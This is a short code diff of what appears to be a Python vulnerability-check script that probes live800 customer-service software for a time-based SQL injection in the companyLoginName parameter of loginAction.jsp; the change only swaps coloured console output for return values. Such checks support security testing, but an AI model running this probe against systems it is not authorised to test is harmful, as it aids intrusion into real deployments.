@@ -9,8 +9,8 @@ description: 文件/live800/loginAction.jsp中,参数companyLoginName存在时�
 import sys
 import time
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class live800_loginAction_sqli_BaseVerify:
     def __init__(self, url):
@@ -27,12 +27,12 @@ class live800_loginAction_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
             if time.time() - start_time >= 6:
-                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = live800_loginAction_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
